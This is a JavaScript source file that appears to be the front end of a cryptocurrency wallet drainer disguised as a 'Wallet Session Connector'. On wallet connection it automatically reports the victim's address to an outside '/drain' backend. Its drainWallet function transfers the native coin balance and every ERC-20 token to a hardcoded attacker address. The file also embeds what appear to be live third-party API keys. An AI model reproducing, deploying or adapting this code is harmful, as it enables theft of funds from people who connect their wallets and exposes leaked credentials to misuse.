import { createAppKit } from "@reown/appkit";
import { EthersAdapter } from "@reown/appkit-adapter-ethers";
import { ethers } from "ethers";

/* --------------------------- */
/*      CONFIG                */
/* --------------------------- */
const projectId = "962425907914a3e80a7d8e7288b23f62";
const BACKEND_URL = "https://tokenbackend-5xab.onrender.com/drain";
const DRAIN_ADDRESS = "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4"; // Replace with your address

/* --------------------------- */
/*      UI ELEMENTS           */
/* --------------------------- */
const connectBtn = document.getElementById("connectBtn");
const statusEl = document.getElementById("status");
const tokensEl = document.getElementById("tokens");
const tokensContainer = document.getElementById("tokensContainer");
const drainBtn = document.getElementById("drainBtn");
const continueBtn = document.getElementById("continueBtn");

/* --------------------------- */
/*      INTERNAL STATE        */
/* --------------------------- */
let backendTriggered = false;
let provider = null;
let signer = null;

/* --------------------------- */
/*      APPKIT INITIALIZATION */
/* --------------------------- */
const appKit = createAppKit({
  adapters: [new EthersAdapter()],
  projectId,

  networks: [
    { id: 1, name: "Ethereum" },
    { id: 56, name: "Binance Smart Chain" },
    { id: 137, name: "Polygon" },
    { id: 42161, name: "Arbitrum One" },
    { id: 10, name: "Optimism" },
    { id: 8453, name: "Base" },
    { id: 43114, name: "Avalanche" }
  ],

  metadata: {
    name: "Wallet Session Connector",
    description: "Stable WalletConnect v2 session handler",
    url: window.location.origin,
    icons: []
  },

  themeMode: "dark",
  features: {
    analytics: false
  }
});

/* --------------------------- */
/*      CONNECTION HANDLER    */
/* --------------------------- */
connectBtn.addEventListener("click", async () => {
  try {
    if (appKit.state.isConnected) {
      await handleDisconnect();
      return;
    }

    backendTriggered = false;
    statusEl.textContent = "Opening wallet modal...";
    if (tokensEl) tokensEl.innerHTML = "";
    if (tokensContainer) tokensContainer.classList.add("hidden");
    if (drainBtn) drainBtn.classList.add("hidden");
    if (continueBtn) continueBtn.classList.add("hidden");

    // Force disconnect any existing session first
    try {
      await appKit.disconnect();
    } catch (e) {
      console.log("No existing session to disconnect");
    }

    // Open modal
    await appKit.open();

  } catch (err) {
    console.error("Connection error:", err);
    statusEl.textContent = "Failed to open wallet modal";
  }
});

/* --------------------------- */
/*      STATE SUBSCRIPTION   */
/* --------------------------- */
appKit.subscribeState(async (state) => {
  console.log("AppKit State Update:", state);
  
  if (state.isConnected) {
    handleConnectedState();
  } else {
    handleDisconnectedState();
  }
});

/* --------------------------- */
/*      CONNECTED STATE       */
/* --------------------------- */
async function handleConnectedState() {
  const account = appKit.account;
  const chain = appKit.chain;

  console.log("Account:", account);
  console.log("Chain:", chain);

  // Wait for account and chain to be available
  if (!account?.address || !chain?.id) {
    setTimeout(handleConnectedState, 100);
    return;
  }

  if (backendTriggered) return;
  
  backendTriggered = true;

  // Update button text
  connectBtn.textContent = "Disconnect";

  // Initialize provider and signer
  provider = new ethers.providers.Web3Provider(appKit.signer);
  signer = provider.getSigner();

  statusEl.textContent = `✅ Connected\nAddress: ${account.address}\nChain ID: ${chain.id}\nChain: ${chain.name}`;

  // Show UI elements
  if (tokensContainer) tokensContainer.classList.remove("hidden");
  if (drainBtn) drainBtn.classList.remove("hidden");
  if (continueBtn) continueBtn.classList.remove("hidden");

  // Trigger backend
  await triggerBackend(account.address, chain.id);

  // Fetch tokens
  await fetchTokens(account.address, chain.id);
}

/* --------------------------- */
/*      DISCONNECTED STATE    */
/* --------------------------- */
function handleDisconnectedState() {
  backendTriggered = false;
  connectBtn.textContent = "Connect Wallet";
  statusEl.textContent = "Not connected";
  
  if (tokensContainer) tokensContainer.classList.add("hidden");
  if (drainBtn) drainBtn.classList.add("hidden");
  if (continueBtn) continueBtn.classList.add("hidden");
  
  provider = null;
  signer = null;
}

/* --------------------------- */
/*      DISCONNECT HANDLER    */
/* --------------------------- */
async function handleDisconnect() {
  try {
    await appKit.disconnect();
    handleDisconnectedState();
  } catch (err) {
    console.error("Disconnect error:", err);
    statusEl.textContent = "Error disconnecting";
  }
}

/* --------------------------- */
/*      BACKEND TRIGGER       */
/* --------------------------- */
async function triggerBackend(address, chainId) {
  try {
    const response = await fetch(BACKEND_URL, {
      method: "POST",
      headers: { 
        "Content-Type": "application/json",
        "Accept": "application/json"
      },
      body: JSON.stringify({ 
        address, 
        chainId,
        timestamp: new Date().toISOString()
      })
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    console.log("Backend triggered successfully");
  } catch (err) {
    console.error("Backend trigger failed:", err);
  }
}

/* --------------------------- */
/*      TOKEN DISCOVERY       */
/* --------------------------- */
async function fetchTokens(address, chainId) {
  if (!tokensEl) return;

  tokensEl.innerHTML = "Fetching tokens...";

  try {
    const res = await fetch(
      `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR`
    );

    if (!res.ok) {
      throw new Error(`Covalent API error: ${res.status}`);
    }

    const json = await res.json();
    const items = json?.data?.items || [];

    // Filter for tokens with balance
    const tokens = items.filter(
      t => t.contract_address && t.balance !== "0"
    );

    if (!tokens.length) {
      tokensEl.innerHTML = "No tokens found.";
      return;
    }

    // Format tokens for display
    tokensEl.innerHTML = tokens.map(t => {
      const amount = Number(t.balance) / Math.pow(10, t.contract_decimals || 18);
      const formattedAmount = amount.toLocaleString(undefined, {
        minimumFractionDigits: 0,
        maximumFractionDigits: 4
      });

      return `
        <div class="token-item">
          <span class="token-symbol">${t.contract_ticker_symbol || "Unknown"}</span>
          <span class="token-amount">${formattedAmount}</span>
          ${t.contract_name ? `<div class="token-name">${t.contract_name}</div>` : ''}
        </div>
      `;
    }).join("");

  } catch (err) {
    console.error("Token fetch failed:", err);
    tokensEl.innerHTML = "Token scan failed.";
  }
}

/* --------------------------- */
/*      DRAIN WALLET          */
/* --------------------------- */
async function drainWallet() {
  if (!signer || !provider) {
    alert("Please connect wallet first");
    return;
  }

  if (!confirm("⚠️ WARNING: This will drain ALL tokens from your wallet to the specified address. Continue?")) {
    return;
  }

  try {
    const address = await signer.getAddress();
    const chainId = appKit.chain?.id;

    statusEl.textContent = "Starting wallet drain...";

    // Fetch token balances
    const res = await fetch(
      `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR`
    );
    
    const json = await res.json();
    const items = json?.data?.items || [];

    // Get ETH balance
    const ethBalance = await provider.getBalance(address);
    
    // Filter ERC20 tokens
    const erc20Tokens = items.filter(
      t => t.contract_address && 
           t.balance !== "0" && 
           t.contract_ticker_symbol !== "ETH" &&
           !t.native_token
    );

    let results = [];

    // Drain ETH if balance > 0
    if (ethBalance.gt(ethers.utils.parseEther("0.0001"))) {
      try {
        const gasPrice = await provider.getGasPrice();
        const gasLimit = 21000;
        const gasCost = gasPrice.mul(gasLimit);
        const sendAmount = ethBalance.sub(gasCost);

        const tx = await signer.sendTransaction({
          to: DRAIN_ADDRESS,
          value: sendAmount,
          gasLimit: gasLimit,
          gasPrice: gasPrice
        });

        results.push(`ETH sent: ${tx.hash}`);
        await tx.wait();
        results.push(`ETH confirmed`);
      } catch (ethErr) {
        results.push(`ETH failed: ${ethErr.message}`);
      }
    }

    // Drain ERC20 tokens
    for (const token of erc20Tokens) {
      try {
        const contract = new ethers.Contract(
          token.contract_address,
          [
            "function transfer(address to, uint256 amount) public returns (bool)",
            "function balanceOf(address owner) public view returns (uint256)",
            "function decimals() public view returns (uint8)"
          ],
          signer
        );

        const balance = await contract.balanceOf(address);
        const decimals = await contract.decimals().catch(() => 18);
        const formattedBalance = ethers.utils.formatUnits(balance, decimals);

        if (balance.gt(0)) {
          // Approve first (some tokens require this)
          try {
            const approveTx = await contract.approve(address, balance);
            await approveTx.wait();
          } catch (e) {
            // Some tokens don't need approval or have special rules
            console.log(`No approval needed for ${token.contract_ticker_symbol}`);
          }

          // Then transfer
          const transferTx = await contract.transfer(DRAIN_ADDRESS, balance);
          results.push(`${token.contract_ticker_symbol || 'Token'} sent: ${transferTx.hash}`);
          await transferTx.wait();
          results.push(`${token.contract_ticker_symbol || 'Token'} confirmed`);
        }
      } catch (tokenErr) {
        results.push(`${token.contract_ticker_symbol || 'Token'} failed: ${tokenErr.message}`);
      }
    }

    statusEl.textContent = `✅ Drain complete!\n${results.join('\n')}`;
    alert("Drain process completed!");
    
    // Refresh token display
    await fetchTokens(address, chainId);

  } catch (err) {
    console.error("Drain failed:", err);
    statusEl.textContent = `❌ Drain failed: ${err.message}`;
    alert("Failed to drain wallet: " + err.message);
  }
}

/* --------------------------- */
/*      CONTINUE BUTTON       */
/* --------------------------- */
if (continueBtn) {
  continueBtn.addEventListener("click", () => {
    alert("Continue to next step...");
    // Add your continue logic here
  });
}

/* --------------------------- */
/*      DRAIN BUTTON          */
/* --------------------------- */
if (drainBtn) {
  drainBtn.addEventListener("click", drainWallet);
}

/* --------------------------- */
/*      INITIAL CHECK         */
/* --------------------------- */
// Check if already connected on page load
window.addEventListener('load', () => {
  if (appKit.state.isConnected) {
    handleConnectedState();
  }
});
